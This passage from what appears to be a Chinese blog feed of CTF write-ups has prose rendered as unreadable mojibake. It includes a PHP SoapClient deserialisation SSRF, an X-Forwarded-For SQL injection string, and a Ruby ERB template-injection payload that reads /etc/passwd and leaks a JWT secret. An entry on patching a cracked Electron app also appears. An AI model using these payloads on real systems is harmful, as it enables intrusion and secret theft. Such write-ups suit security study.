src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813010632531.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"a:1:&#123;s:4:"</span>name<span class="token string double-quoted-string">";s:199:"</span><span class="token string double-quoted-string">"]=> object(SoapClient)#1 (4) &#123; ["</span>uri<span class="token string double-quoted-string">"]=> string(3) "</span><span class="token number">123</span><span class="token string double-quoted-string">" ["</span>location<span class="token string double-quoted-string">"]=> string(25) "</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/flag.php" ["_user_agent"]=> string(56) "N0rth3ty Cookie: PHPSESSID=817olmp68ukmnofc2mlp762ql0 " ["_soap_version"]=> int(1) &#125; &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1.ç”¨<code>extract()</code>å‡½æ•°å°†<code>$b</code>è¦†ç›–ä¸º<code>call_user_func</code></p><p>2.æ­¤æ—¶åºåˆ—åŒ–å¼•æ“åˆå˜ä¸ºé»˜è®¤çš„phpäº†ï¼Œç„¶åæ‰§è¡Œ<code>session_start()</code>ï¼Œåˆ™ä¼šè¯»å–åˆšåˆšåºåˆ—åŒ–å¥½çš„æ–‡ä»¶ï¼Œè¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>3.<code>$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code>ï¼Œ<code>reset</code>æŒ‡é’ˆå‰ç§»åˆ°å¼€å¤´ï¼ŒæŠŠsessionå’Œå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªæ•°ç»„ã€‚</p><p>4.</p><pre class="line-numbers language-none"><code class="language-none">&#96;call_user_func($b, $a);&#96;&#x3D;&#96;call_user_func(call_user_func, $a);&#96;&#x3D;&#96;call_user_func($a)&#96;&#x3D;&#96;call_user_func(array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);)&#96;,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä¼šæ‰§è¡Œå‡½æ•°åä¸º<code>welcome_to_the_lctf2018</code>çš„æ–¹æ³•ï¼Œæ˜¾ç„¶ï¼Œè¿™ä¸ªæ–¹æ³•ä¸å­˜åœ¨ï¼Œå°±è°ƒç”¨äº†<code>SoapClient</code>ç±»é­”æœ¯æ–¹æ³•<code>__call()</code>ç„¶åæ‰§è¡Œä¸€ä¸ªè¯·æ±‚(è¿™æ˜¯ç”±<code>SoapClient</code>ç±»çš„å†…éƒ¨ä»£ç å†³å®šçš„)</p><h4 id="æ”¹cookie"><a href="#æ”¹cookie" class="headerlink" title="æ”¹cookie"></a>æ”¹cookie</h4><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813010738280.png"></p><h2 id="å¥‡æ–‡å…±èµ"><a href="#å¥‡æ–‡å…±èµ" class="headerlink" title="å¥‡æ–‡å…±èµ"></a>å¥‡æ–‡å…±èµ</h2><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102960092">https://blog.csdn.net/weixin_44077544/article/details/102960092</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">ååºåˆ—åŒ–ä¹‹PHPåŸç”Ÿç±»çš„åˆ©ç”¨</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡electronåç¼–è¯‘ä¹‹JavaScriptç®€å•æ··æ·†è®°å½•</title>
      <link href="/p/2475939034.html"/>
      <url>/p/2475939034.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ‘¸é±¼çš„æ—¶å€™æƒ³è¾¹æ‰“æ¸¸æˆè¾¹çœ‹çœ‹å°è¯´ï¼Œå°è¯´åˆæ˜¯txtï¼Œäºæ˜¯æ‰¾äº†ä¸ªé˜…è¯»å™¨ï¼Œå¯æƒœè¦ä¼šå‘˜ï¼Œä¸€æœï¼Œæœ‰ç ´è§£ç‰ˆ</p><p><a href="https://www.52pojie.cn/thread-1348204-1-1.html"><strong>ã€EPUBé˜…è¯»å™¨ã€‘Neat Reader v6.0.8 ä¾‹è¡Œæ›´æ–° å»å¹¿å‘Š&amp;å»å„ç§é™åˆ¶&amp;å¯çè—</strong></a></p><p>åœ¨æ­¤æ„Ÿè°¢@<a href="https://www.52pojie.cn/home.php?mod=space&uid=580490">å¤œæ³‰</a>çš„æ— ç§å¥‰çŒ®ï¼</p><p>ç ´è§£è¡¥ä¸çœ‹äº†ä¸‹ï¼Œæ˜¯app.asarï¼Œçªç„¶æƒ³åˆ°ä»¥å‰æ±‰åŒ–clashçš„æ—¶å€™ï¼Œä¹Ÿæ˜¯å¼„çš„è¿™ä¸ªï¼Œäºæ˜¯ä¹è¿™æ¬¡ä¹Ÿæ¥è¯•è¯•ï¼ŒæŠŠä»–æ”¹æˆæˆ‘æƒ³è¦çš„å½¢çŠ¶ã€‚</p><h2 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h2><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">#å…ˆå®‰è£…npm install asar -g#è§£åŒ…asar extract app.asar app#æ‰“åŒ…asar pack app app.asar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœäº†ä¸‹ç›¸å…³å­—ç¬¦ä¸²ï¼Œæ”¹äº†å‡ ä¸ªä½ç½®ï¼Œ</p><p>ç„¶åé—®é¢˜æ¥äº†</p><p><img src="/../images/JavaScript%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86%E8%AE%B0%E5%BD%95/image-20210811003235195.png"></p><p>è¿™åœ°æ–¹çš„å­—ç¬¦ä¸²ï¼Œä¸€ç›´æ²¡æœåˆ°ï¼ŒæŠ˜è…¾äº†å¾ˆä¹…ï¼Œç¿»äº†åŠå¤©ä»£ç ã€‚unicodeï¼Œåå…­è¿›åˆ¶ï¼Œå„ä¸ªæ ·å¼éƒ½æœäº†ä¸€éï¼Œç®€ç›´æ€€ç–‘äººç”Ÿã€‚</p><p>ä¹‹åæ²¡åŠæ³•ï¼Œåªèƒ½ä½¿å‡ºå¤§æ€å™¨ï¼Œæ–‡ä»¶æ¯”è¾ƒï¼Œç¿»æ‰¾äº†ä¸€ä¸‹ï¼Œç»ˆäºæ‰¾åˆ°äº†ä½ç½®ï¼Œå¹ä¸ºè§‚æ­¢</p><h3 id="æ··æ·†"><a href="#æ··æ·†" class="headerlink" title="æ··æ·†"></a>æ··æ·†</h3><p>åŸæ¥ï¼Œä¿®æ”¹è€…åŠ äº†ä¸ªæ··æ·†å‡½æ•°ï¼Œå°†ä¸­æ–‡è½¬åŒ–ä¸º[asciiç 10è¿›åˆ¶å¼‚æˆ–0x12çš„æ•°å­—],è¿™æ ·å°±å‡å°‘äº†å­—ç¬¦ä¸²æœç´¢çš„é£é™©ã€‚</p><p><img src="/../images/JavaScript%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86%E8%AE%B0%E5%BD%95/image-20210811003537545.png"></p><p><img src="/../images/JavaScript%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86%E8%AE%B0%E5%BD%95/image-20210811003552075.png"></p><p>æå–å‡ºæ¥æ”¹æ”¹è¿è¡Œä¸‹</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">D &#x3D; (str) &#x3D;&gt; &#123;    var V1,        I_NMI2,        PcigmAelG3 &#x3D; &quot;&quot;;    I_NMI2 &#x3D; str[&quot;split&quot;](&quot;.&quot;);    for (V1 &#x3D; 0; V1 &lt; I_NMI2[&quot;length&quot;]; V1++) &#123;        PcigmAelG3 +&#x3D; String[&quot;fromCharCode&quot;](I_NMI2[V1] ^ 0x12);    &#125;    console.log(PcigmAelG3);&#125;;D(&quot;50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.8220.50.39.32.98.125.120.123.119.60.113.124.82.22798.27867.50.63.50.22928.26510.35291.24453.35831.36733.20196.22895.30010.35813.25917.25363.27505.29274.65310.35831.34935.19987.20183.38466.30010.20124.23412.20082.21662.30726.31332.30460.30358.65289.19999.24453.23572.35831.34935.19987.30010.20124.21844.19976.25092.32791.38732.27847.30010.36870.65310.21556.21003.65310.19986.21013.21532.26510.35813.30010.25125.33272.36109.51&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/JavaScript%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86%E8%AE%B0%E5%BD%95/image-20210811003627648.png"></p><p>è€Œä¸”æˆ‘ä¹Ÿæ˜¯åˆšåˆšæ‰çŸ¥é“ï¼Œ<code>str.split</code>ä¹Ÿå¯ä»¥<code>str[&quot;split&quot;]</code></p><p>ç®—æ˜¯å¼€è¾Ÿäº†æ–°æ€è·¯ï¼Œæ”¶è·å¾ˆå¤§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> electron </tag>
            
            <tag> app.asar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[RoarCTF 2019]Online Proxy</title>
      <link href="/p/3818512365.html"/>
      <url>/p/3818512365.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>buuä¸Šçš„è¿™é¢˜æ…¢çš„è¦æ­»ï¼Œä¸€ä¸ªè¯·æ±‚å¡åç§’ï¼Œæ— è¯­äº†</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç®€å•çš„sqlæ³¨å…¥</p><p>ç±»ä¼¼äºäºŒæ¬¡æ³¨å…¥ï¼Œå…ˆæ˜¯åœ¨è¯·æ±‚å¤´æ‰“å…¥</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: 1&#39; or &#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä¼šå‡ºç°åœ¨<code>Current Ip</code>ï¼Œä¹‹å‰æ‰“å…¥çš„ä¼šå‡ºç°åœ¨<code>Last Ip</code></p><p>ç›´æ¥è·‘è„šæœ¬å§ã€‚</p><p>æ— è¯­äº†ï¼Œè¿™ä¹Ÿå¤ªæ…¢äº†</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RoarCTF-2019-Online-Proxy/image-20210811004531898.png"></p><p>è·‘äº†å››ä¸ªå°æ—¶è¿˜æ²¡è·‘å®Œï¼ŒçœŸæ— è¯­äº†ã€‚</p><p>æ— è¯­äº†ï¼Œè·‘äº†å…«ä¸ªå°æ—¶ï¼Œè¿˜æœ‰æœ€å5ä½ï¼Œé¶æœºæŒ‚äº†ï¼ŒçœŸæ— è¯­äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[SCTF2019]Flag Shop</title>
      <link href="/p/1841453998.html"/>
      <url>/p/1841453998.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ruby erb|ssti|jwt]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810153449038.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç‚¹workä¼šåŠ é’±ï¼Œæ‰€ä»¥å¯ä»¥007ä¸åœå·¥ä½œè¿™æ ·å‡ ç™¾å¹´åå°±èƒ½ä¹°æˆ¿äº†ã€‚</p><p>è¿™é¢˜å¾ˆå®¹æ˜“æƒ³åˆ°æœ‰å…³cookieã€‚</p><p>æŠ“ä¸ªåŒ…å†éšä¾¿ç‚¹ä¸€ç‚¹<img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810154500243.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810154529026.png"></p><p>ç½‘é¡µä¸Šå·²ç»77äº†ï¼Œburpé‡Œè¿˜æ˜¯74ï¼Œå¯è§é‡‘é¢ä¸æ˜¯å­˜sessionï¼Œè€Œæ˜¯å­˜åœ¨æœ¬åœ°cookieã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810154700928.png"></p><p>é‚£åªè¦è§£å¼€cookieå°±è¡Œäº†ã€‚</p><p>å› ä¸ºæ˜¯jwtåŠ å¯†ï¼Œç”¨jwtcrackè¯•è¯•ã€‚</p><p>æ²¡è·‘å‡ºæ¥ï¼Œè¿˜æ˜¯å¾—å…ˆæ‰¾åˆ°keyï¼Œå¾—å…ˆçœ‹çœ‹å…¶ä»–åœ°æ–¹ã€‚</p><p>æ‰«äº†æ‰«ç›®å½•ï¼Œå‘ç°robots.txtå­˜åœ¨ã€‚</p><p>é‡Œé¢æ”¾äº†æºç ï¼Œrubyè¯­æ³•ã€‚</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string">'sinatra'</span><span class="token keyword">require</span> <span class="token string">'sinatra/cookies'</span><span class="token keyword">require</span> <span class="token string">'sinatra/json'</span><span class="token keyword">require</span> <span class="token string">'jwt'</span><span class="token keyword">require</span> <span class="token string">'securerandom'</span><span class="token keyword">require</span> <span class="token string">'erb'</span>set <span class="token symbol">:public_folder</span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/static'</span><span class="token constant">FLAGPRICE</span> <span class="token operator">=</span> <span class="token number">1000000000000000000000000000</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>configure <span class="token keyword">do</span>  enable <span class="token symbol">:logging</span>  file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/../log/http.log'</span><span class="token punctuation">,</span><span class="token string">"a+"</span><span class="token punctuation">)</span>  file<span class="token punctuation">.</span>sync <span class="token operator">=</span> <span class="token boolean">true</span>  use <span class="token constant">Rack</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CommonLogger</span><span class="token punctuation">,</span> file<span class="token keyword">end</span>get <span class="token string">"/"</span> <span class="token keyword">do</span>  redirect <span class="token string">'/shop'</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token keyword">end</span>get <span class="token string">"/filebak"</span> <span class="token keyword">do</span>  content_type <span class="token symbol">:text</span>  erb <span class="token builtin">IO</span><span class="token punctuation">.</span>binread __FILE__<span class="token keyword">end</span>get <span class="token string">"/api/auth"</span> <span class="token keyword">do</span>  payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span> uid<span class="token punctuation">:</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span>uuid <span class="token punctuation">,</span> jkl<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span>  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode payload<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>  cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token keyword">end</span>get <span class="token string">"/api/info"</span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span>  json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>uid<span class="token punctuation">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"uid"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>jkl<span class="token punctuation">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">end</span>get <span class="token string">"/shop"</span> <span class="token keyword">do</span>  erb <span class="token symbol">:shop</span><span class="token keyword">end</span>get <span class="token string">"/work"</span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span>  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#&#123;</span>params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex">/[0-9a-z]+/</span><span class="token punctuation">)</span><span class="token delimiter tag">&#125;</span></span>"</span><span class="token punctuation">)</span>      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#&#123;</span>params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">&#125;</span></span> is working"</span> <span class="token keyword">then</span>    auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span>random_number<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    <span class="token constant">ERB</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('<span class="token interpolation"><span class="token delimiter tag">#&#123;</span>params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">&#125;</span></span> working successfully!')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>result  <span class="token keyword">end</span><span class="token keyword">end</span>post <span class="token string">"/shop"</span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token constant">FLAGPRICE</span> <span class="token keyword">then</span>    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>title<span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span>message<span class="token punctuation">:</span> <span class="token string">"no enough jkl"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">else</span>    auth <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">&#123;</span>flag<span class="token punctuation">:</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>title<span class="token punctuation">:</span> <span class="token string">"success"</span><span class="token punctuation">,</span>message<span class="token punctuation">:</span> <span class="token string">"jkl is good thing"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">islogin</span></span>  <span class="token keyword">if</span> cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span> <span class="token keyword">then</span>    redirect to<span class="token punctuation">(</span><span class="token string">'/shop'</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Ruby-ERBæ¨¡æ¿æ³¨å…¥"><a href="#Ruby-ERBæ¨¡æ¿æ³¨å…¥" class="headerlink" title="Ruby ERBæ¨¡æ¿æ³¨å…¥"></a>Ruby ERBæ¨¡æ¿æ³¨å…¥</h3><p><a href="https://www.anquanke.com/post/id/86867">ã€æŠ€æœ¯åˆ†äº«ã€‘æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•å®ŒæˆRuby ERBæ¨¡æ¿æ³¨å…¥</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810161958684.png"></p><p>é‡ç‚¹åœ¨è¿™é‡Œï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°doå’Œnameç›¸ç­‰ï¼Œåˆ™è¾“å‡ºã€‚</p><p>erbçš„æ¨¡æ¿æ³¨å…¥å½¢å¼å¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">&lt;%&#x3D; 7 * 7 %&gt;&lt;%&#x3D; File.open(&#39;&#x2F;etc&#x2F;passwd&#39;).read %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å…¶ä¸­<code>&lt;%=%&gt;</code>å ç”¨äº”ä¸ªå­—ç¬¦ï¼Œè€Œé¢˜ç›®åªç»™äº†ä¸ƒä¸ªå¯æ§å­—ç¬¦ã€‚</p><p>æ‰€ä»¥è¿™é‡Œåˆ©ç”¨rubyçš„<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">é¢„å®šä¹‰å˜é‡</a>ï¼Œåªç”¨ä¸¤ä¸ªå­—ç¬¦ã€‚</p><p>å¦‚ä¸‹æœ‰ä¸¤ä¸ªåŠæ³•ï¼Œå…¶å®æ€è·¯éƒ½ä¸€æ ·ã€‚</p><h4 id="ç›´æ¥è¾“å‡º"><a href="#ç›´æ¥è¾“å‡º" class="headerlink" title="ç›´æ¥è¾“å‡º"></a>ç›´æ¥è¾“å‡º</h4><blockquote><p><code>$&#39;</code> The string to the right of the last successful match. æœ€åä¸€æ¬¡æˆåŠŸåŒ¹é…çš„å³ä¾§çš„å­—ç¬¦ä¸²</p></blockquote><p>åˆ©ç”¨<code>ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</code></p><p>å†…å±‚çš„æ­£åˆ™é™åˆ¶äº†SECRETä¸ºæ•°å­—+å°å†™å­—æ¯ï¼Œé‡ç‚¹æ˜¯å‰é¢çš„æ­£åˆ™ï¼Œ<code>#&#123;&#125;</code>ç±»ä¼¼äºphpé‡Œçš„å–å˜é‡ï¼Œä¸ç”¨ç®¡ã€‚</p><p>å› ä¸ºSECERTæ˜¯ç©ºï¼Œæ‰€ä»¥æŠŠå®Œæˆçš„SECERTç»™è¾“å‡ºå‡ºæ¥äº†ã€‚</p><p>å¦‚å›¾ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810195657304.png"></p><p>åœ¨è¿™å‘ç°rubyçš„matchæŒºæ€ªçš„ï¼Œå¯ä»¥pattern.mathch(string),ä¹Ÿå¯ä»¥string.mathch(pattern)</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810185758372.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810193801522.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810193824137.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SCTF2019-Flag-Shop/image-20210810195735718.png"></p><p><code>unless params[:SECRET].nil?</code>æ„æ€æ˜¯è®¾ç½®äº†SECRETå‚æ•°æ‰æ‰§è¡Œä»£ç å—ï¼Œæ‰€ä»¥è¦è®¾ä¸ªSECRET</p><pre class="line-numbers language-none"><code class="language-none">work?SECRET&#x3D;&amp;name&#x3D;&lt;%&#x3D;$&#39;%&gt;&amp;do&#x3D;&lt;%&#x3D;$&#39;%&gt; is working&#x2F;&#x2F;urlencodework?SECRET&#x3D;&amp;name&#x3D;%3C%25%3D%24&#39;%25%3E&amp;do&#x3D;%3C%25%3D%24&#39;%25%3E%20is%20working<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿”å›å¦‚ä¸‹ï¼Œè¿™æ 